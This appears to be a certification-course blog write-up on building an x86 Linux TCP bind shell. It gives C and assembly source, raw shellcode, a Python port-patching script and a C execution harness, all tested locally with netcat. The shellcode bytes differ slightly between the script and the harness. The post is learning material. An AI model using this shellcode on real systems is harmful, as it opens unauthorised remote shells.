# SLAE course
This blog post has been created for completing the requirements of the SecurityTube Linux.

Assembly Expert certification:
* https://www.pentesteracademy.com/course?id=3

Student ID: SLAE-1523

## Assignment#1: What to do ?

The first step of assignment#1 is to create a TCP bind shell in assembly.

This shellcode needs to be able to:
* Bind to a port
* Execute a shell on incoming connection

The second step is to create a script which will make the port configuration easy.


## 1) First step: create a TCP bind shell
### 1.1) What is a bind shell

A bind shell is a shell that binds to a specific port on the target host to listen for incoming connections.

### 1.2) Example of a TCP bind shell in C
An example of a TCP bind shell in C can be found below. This example has been created in order to help me code the assembly version.
```c
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <unistd.h>


int main()
{
    // Create sockaddr_in struct
    struct sockaddr_in addr;
    // AF_INET for IPv4
    addr.sin_family = AF_INET;
    // Set port number to 4444
    addr.sin_port = htons(4444);
    // Listen on any interface
    addr.sin_addr.s_addr = INADDR_ANY;

    // Create the sock
    // AF_INET for IPv4
    // SOCK_STREAM for TCP connection
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);

    // Bind address to sock
    bind(sockfd, (struct sockaddr *)&addr, sizeof(addr));

    // Use the created sock to listen for connections
    listen(sockfd, 0);

    // Accept connections
    int connfd = accept(sockfd, NULL, NULL);

    // Redirect the STDIN, STDOUT and STDERR into the socket
    for (int i = 0; i < 3; i++)
    {
        dup2(connfd, i);
    }

    // Execute /bin/sh
    execve("/bin/sh", NULL, NULL);
}
```

Now, let's get to work.
=

### 1.3) The assembly code

1.3.1) The first step is to initialize the stack and the registers:
```nasm
;This part initialize the registers and the stack
mov ebp, esp                ;Initialize the stack frame

xor eax, eax                ;Initialize eax to NULL
xor ebx, ebx                ;Initialize ebx to NULL
xor ecx, ecx                ;Initialize ecx to NULL
xor edx, edx                ;Initialize edx to NULL
```

1.3.2) The second step is to push the "sockaddr_in" structure on the stack:
```nasm
;This part push the structure "sockaddr_in" on the stack
;C code representation:
;   struct sockaddr_in addr;
;   addr.sin_family = AF_INET;
;   addr.sin_port = htons(4444);
;   addr.sin_addr.s_addr = INADDR_ANY;

push eax
push eax                    ;Fill the end of the structure with 2 NULL Bytes
push eax                    ;Initialize the variable "addr.sin_addr.s_addr" to listen for all incoming connection (INADDR_ANY) 
push word 0x5c11            ;Initialize the variable "addr.sin_port" to listen on port 4444
push word 0x02              ;Initialize the variable "addr.sin_family" to IPV4 (AF_INET)
```

1.3.3) We can now call the "socket" systemcall which will create an endpoint for communication:
```nasm
;This part initialize and call the "socket" systemcall
mov ax, 0x167               ;Move the "socket" systemcall number inside ax
mov bl, 0x02                ;Move the "AF_INET" value (which means IPV4) inside bl
mov cl, 0x01                ;Move the "SOCK_STREAM" value (which means TCP) inside cl

;C code representation of the systemcall:
; --> int sockfd = socket(AF_INET, SOCK_STREAM, 0);
int 0x80                    ;Execute the systemcall
mov edi, eax                ;Move the return value from the "socket" systemcall into edi
```

1.3.4) Then, we need to call the "bind" systemcall which will bind to the socket:
```nasm
;This part initialize and call the "bind" systemcall
xor eax, eax                ;Initialize eax to NULL
mov ax, 0x169               ;Move the "bind" systemcall number inside ax
mov ebx, edi                ;Move the return value of "socket" inside ebx 
mov ecx, esp                ;Point ecx to the structure
;Get the structure size
mov edx, ebp
sub edx, esp                ;Use the stack pointers (esp and ebp to calculate the size of the structure)

;C code representation of the systemcall:
; --> bind(sockfd, (struct sockaddr *)&addr, sizeof(addr));
int 0x80            ;Go for it
```

1.3.5) Let's call the "listen" systemcall wich will listen for connections on the socket:
```nasm 
;This part initialize and call the "listen" systemcall
xor eax, eax                ;Initialize eax to NULL
mov ax, 0x16b               ;Move the "listen" systemcall number inside ax
mov ebx, edi                ;Move the return value of "socket" inside ebx
xor ecx, ecx                ;Initialize ecx to NULL

;C code representation of the systemcall:
; --> listen(sockfd, 0);
int 0x80                    ;execute systemcall
```

1.3.6) The "accept" systemcall is used to accept a connection on the socket:
```nasm
;This part initialize and call the "accept" systemcall
xor eax, eax                ;Initialize eax to NULL
mov ax, 0x16c               ;Move the "accept" systemcall number inside ax
mov ebx, edi                ;Move the return value of "socket" inside ebx
xor ecx, ecx                ;Initialize ecx to NULL
xor edx, edx                ;Initialize edx to NULL
xor esi, esi                ;Initialize esi to NULL

;C code representation of the systemcall:
; -- > int connfd = accept(sockfd, NULL, NULL);
int 0x80                    ;Execute systemcall
mov esi, eax                ;Move the return value from the "accept" systemcall into esi
```

1.3.7) This part of the code will use dup2 to redirect the STDIN, STDOUT and STDERR into the socket:
```nasm
;This part redirect the STDIN, STDOUT and STDERR into the socket
mov cl, 3                   ;Initialize cl to 3
dup:
    xor eax, eax            ;Initialize eax to NULL
    mov al, 0x3f            ;Move the "dup2" systemcall number inside al 
    mov ebx, esi            ;Move the return value of "accept" in ebx
    dec cl                  ;Decrement cl to 1

    ;C code representation of the systemcall:
    ;for (int i = 0; i < 3; i++)
    ;{
    ;    dup2(connfd, i);
    ;}
    int 0x80                ;Execute systemcall
    inc cl                  ;Increment cl to 1
    loop dup                ;Loop until cl is equal to 0 (Three times)
```

1.3.8) It's finaly time to execute the shell:
```nasm
;This part initialize and call the "execve" systemcall
xor eax, eax                ;Initialize eax to NULL
push eax                    ;Push a NULL Byte on the stack
push 0x68732f2f
push 0x6e69622f             ;Push "/bin//sh" on the stack
mov al, 0xb                 ;Move the "execve" systemcall number inside al
mov ebx, esp                ;Initialize ebx to "/bin//sh%00"
xor ecx, ecx                ;Initialize ecx to NULL
xor edx, edx                ;Initialize edx to NULL
;C code representation of the systemcall:
; --> execve("/bin/sh", NULL, NULL);
int 0x80                    ;Execute systemcall
```

You can find the whole code below:
-
```nasm
;ASM (x86) bind shell on port 4444

global _start

_start:
    ;This part initialize the registers and the stack
    mov ebp, esp                ;Initialize the stack frame

    xor eax, eax                ;Initialize eax to NULL
    xor ebx, ebx                ;Initialize ebx to NULL
    xor ecx, ecx                ;Initialize ecx to NULL
    xor edx, edx                ;Initialize edx to NULL


    ;This part push the structure "sockaddr_in" on the stack
    ;struct sockaddr_in addr;
    ;addr.sin_family = AF_INET;
    ;addr.sin_port = htons(4444);
    ;addr.sin_addr.s_addr = INADDR_ANY;
    push eax
    push eax                    ;Fill the end of the structure with 2 NULL Bytes
    push eax                    ;Initialize the variable "addr.sin_addr.s_addr" to listen for all incoming connection (INADDR_ANY) 
    push word 0x5c11            ;Initialize the variable "addr.sin_port" to listen on port 4444
    push word 0x02              ;Initialize the variable "addr.sin_family" to IPV4 (AF_INET)


    ;This part initialize and call the "socket" systemcall
    mov ax, 0x167               ;Move the "socket" systemcall number inside ax
    mov bl, 0x02                ;Move the "AF_INET" value (which means IPV4) inside bl
    mov cl, 0x01                ;Move the "SOCK_STREAM" value (which means TCP) inside cl
    
    ;C code representation of the systemcall:
    ; --> int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    int 0x80                    ;Execute the systemcall
    mov edi, eax                ;Move the return value from the "socket" systemcall into edi


    ;This part initialize and call the "bind" systemcall
    xor eax, eax                ;Initialize eax to NULL
    mov ax, 0x169               ;Move the "bind" systemcall number inside ax
    mov ebx, edi                ;Move the return value of "socket" inside ebx 
    mov ecx, esp                ;Point ecx to the structure
    ;Get the structure size
    mov edx, ebp
    sub edx, esp                ;Use the stack pointers (esp and ebp to calculate the size of the structure)
    
    ;C code representation of the systemcall:
    ; --> bind(sockfd, (struct sockaddr *)&addr, sizeof(addr));
    int 0x80            ;Go for it


    ;This part initialize and call the "listen" systemcall
    xor eax, eax                ;Initialize eax to NULL
    mov ax, 0x16b               ;Move the "listen" systemcall number inside ax
    mov ebx, edi                ;Move the return value of "socket" inside ebx
    xor ecx, ecx                ;Initialize ecx to NULL
    
    ;C code representation of the systemcall:
    ; --> listen(sockfd, 0);
    int 0x80                    ;execute systemcall


    ;This part initialize and call the "accept" systemcall
    xor eax, eax                ;Initialize eax to NULL
    mov ax, 0x16c               ;Move the "accept" systemcall number inside ax
    mov ebx, edi                ;Move the return value of "socket" inside ebx
    xor ecx, ecx                ;Initialize ecx to NULL
    xor edx, edx                ;Initialize edx to NULL
    xor esi, esi                ;Initialize esi to NULL
    
    ;C code representation of the systemcall:
    ; -- > int connfd = accept(sockfd, NULL, NULL);
    int 0x80                    ;Execute systemcall
    mov esi, eax                ;Move the return value from the "accept" systemcall into esi


    ;This part redirect the STDIN, STDOUT and STDERR into the socket
    mov cl, 3                   ;Initialize cl to 3
    dup:
        xor eax, eax            ;Initialize eax to NULL
        mov al, 0x3f            ;Move the "dup2" systemcall number inside al 
        mov ebx, esi            ;Move the return value of "accept" in ebx
        dec cl                  ;Decrement cl to 1

        ;C code representation of the systemcall:
        ;for (int i = 0; i < 3; i++)
        ;{
        ;    dup2(connfd, i);
        ;}
        int 0x80                ;Execute systemcall
        inc cl                  ;Increment cl to 1
        loop dup                ;Loop three times until cl is equal to 0


    ;This part initialize and call the "execve" systemcall
    xor eax, eax                ;Initialize eax to NULL
    push eax                    ;Push a NULL Byte on the stack
    push 0x68732f2f
    push 0x6e69622f             ;Push "/bin//sh" on the stack
    mov al, 0xb                 ;Move the "execve" systemcall number inside al
    mov ebx, esp                ;Initialize ebx to "/bin//sh%00"
    xor ecx, ecx                ;Initialize ecx to NULL
    xor edx, edx                ;Initialize edx to NULL
    ;C code representation of the systemcall:
    ; --> execve("/bin/sh", NULL, NULL);
    int 0x80                    ;Execute systemcall
```

Let's compile and execute it: 
```console
kali@kali:/tmp/$ nasm -f elf32 -o bind_shell.o bind_shell.nasm
kali@kali:/tmp/$ ld -m elf_i386 -z execstack -o bind_shell bind_shell.o
kali@kali:/tmp/$ ./bind_shell
```

We can check if the port 4444 is open using netstat:
```console
kali@kali:/tmp$ netstat -antp | grep 4444
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN      1659/./bind_shell 
```

We can now connect to this new port using for example netcat and get our shell:
```console
kali@kali:/tmp$ nc -nv 127.0.0.1 4444
(UNKNOWN) [127.0.0.1] 4444 (?) open
id
uid=1000(kali) gid=1000(kali) groups=1000(kali),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),118(bluetooth),128(lpadmin),132(scanner)
pwd
/tmp
```

# 2) Second step: make the port configuration easy

Before explaining, the python script used for this task, we need to retrieve the hexadecimal format of our shellcode. But instead of a simple '\x' before our hexadecimal value, we will need two of them '\\\x'. 

Why ? Because our python script won't interpret our shellcode without this part.

We can easily do that by using the following objdump command:
```console
kali@kali:/tmp$ objdump -d ./bind_shell |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'

"\\x89\\xe5\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x50\\x50\\x50\\x66\\x68\\x11\\x5c\\x66\\x6a\\x02\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc7\\x31\\xc0\\x66\\xb8\\x69\\x01\\x89\\xfb\\x89\\xe1\\x89\\xea\\x29\\xe2\\xcd\\x80\\x31\\xc0\\x66\\xb8\\x6b\\x01\\x89\\xfb\\x31\\xc9\\xcd\\x80\\x31\\xc0\\x66\\xb8\\x6c\\x01\\x89\\xfb\\x31\\xc9\\x31\\xd2\\x31\\xf6\\xcd\\x80\\x89\\xc6\\xb1\\x03\\x31\\xc0\\xb0\\x3f\\x89\\xf3\\xfe\\xc9\\xcd\\x80\\xfe\\xc1\\xe2\\xf2\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\xb0\\x0b\\x89\\xe3\\x31\\xc9\\x31\\xd2\\xcd\\x80"
```

We can now add this shellcode to our python script. This script is pretty simple, it parses the 'shellcode' variable content, look for the '\\x11\\x5c' (which is 4444 in reverse hexadecimal) pattern and replace it by the port value asked by the user.

Here is the code:
```python
#!/usr/bin/python3

import sys
import socket

# The Shellcode used (port: 4444)
shellcode = '\\x89\\xe5\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x50\\x50\\x50\\x66\\x68\\x11\\x5c\\x66\\x6a\\x02\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc7\\x31\\xc0\\x66\\xb8\\x69\\x01\\x89\\xfb\\x89\\xe1\\x89\\xea\\x29\\xe2\\xcd\\x80\\x31\\xc0\\x66\\xb8\\x6b\\x01\\x89\\xfb\\x31\\xc9\\xcd\\x80\\x31\\xc0\\x66\\xb8\\x6c\\x01\\x89\\xfb\\x31\\xc9\\x31\\xd2\\xcd\\x80\\x31\\xff\\x89\\xc7\\xb1\\x03\\x31\\xc0\\xb0\\x3f\\x89\\xfb\\xfe\\xc9\\xcd\\x80\\xfe\\xc1\\xe2\\xf2\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\xb0\\x0b\\x89\\xe3\\x31\\xc9\\x31\\xd2\\xcd\\x80'

# Check if a port is specified
if len(sys.argv) < 2:
    print ('Usage: python {name} [port_to_bind]'.format(name = sys.argv[0]))
    print ('Example: python {name} 2222'.format(name = sys.argv[0]))
    exit(1)

# Convert the port type from "string" to "hexadecimal" format
port = hex(socket.htons(int(sys.argv[1])))

# Replace the port number
shellcode = shellcode.replace('\\x11\\x5c', '\\x{0}\\x{1}'.format(port[4:6],port[2:4]))

# Print the shellcode
print(shellcode)
```

This script will give us the following result:
```console
kali@kali:/tmp$ chmod +x modify_bind_shell.py 
kali@kali:/tmp$ ./modify_bind_shell.py 2222

\x89\xe5\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\x50\x50\x66\x68\x08\xae\x66\x6a\x02\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc7\x31\xc0\x66\xb8\x69\x01\x89\xfb\x89\xe1\x89\xea\x29\xe2\xcd\x80\x31\xc0\x66\xb8\x6b\x01\x89\xfb\x31\xc9\xcd\x80\x31\xc0\x66\xb8\x6c\x01\x89\xfb\x31\xc9\x31\xd2\xcd\x80\x31\xff\x89\xc7\xb1\x03\x31\xc0\xb0\x3f\x89\xfb\xfe\xc9\xcd\x80\xfe\xc1\xe2\xf2\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\xb0\x0b\x89\xe3\x31\xc9\x31\xd2\xcd\x80
```

In order to test the result, we can now used a C program which will execute our shellcode.

The C program can be found below:
```c
#include <stdio.h>
#include <string.h>

// the shellcode is stored here
unsigned char code[] = \
"\x89\xe5\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\x50\x50\x66\x68\x08\xae\x66\x6a\x02\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc7\x31\xc0\x66\xb8\x69\x01\x89\xfb\x89\xe1\x89\xea\x29\xe2\xcd\x80\x31\xc0\x66\xb8\x6b\x01\x89\xfb\x31\xc9\xcd\x80\x31\xc0\x66\xb8\x6c\x01\x89\xfb\x31\xc9\x31\xd2\x31\xf6\xcd\x80\x89\xc6\xb1\x03\x31\xc0\xb0\x3f\x89\xf3\xfe\xc9\xcd\x80\xfe\xc1\xe2\xf2\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\xb0\x0b\x89\xe3\x31\xc9\x31\xd2\xcd\x80";

int main()
{
	// print the length of the shellcode
	printf("Shellcode Length:  %d\n", strlen(code));
	
	// convert shellcode to a function
	int (*ret)() = (int(*)())code;

	// execute the shellcode
	ret();

}
```

Let's compile and execute this program:
```console
kali@kali:/tmp$ gcc test_shellcode.c -o test_shellcode -m32 -fno-stack-protector -z execstack 
kali@kali:/tmp$ ./test_shellcode 
Shellcode Length:  117

```
We can use netcat to check if the port 2222 is open:
```console
kali@kali:/tmp$ netstat -antp | grep 2222
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
tcp        0      0 0.0.0.0:2222            0.0.0.0:*               LISTEN      1738/./test_shellcode
```

Finaly, netcat can be used to access our bind shell:
```console
kali@kali:/tmp$ nc -nv 127.0.0.1 2222
(UNKNOWN) [127.0.0.1] 2222 (?) open
id
uid=1000(kali) gid=1000(kali) groups=1000(kali),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),118(bluetooth),128(lpadmin),132(scanner)
whoami
kali
```

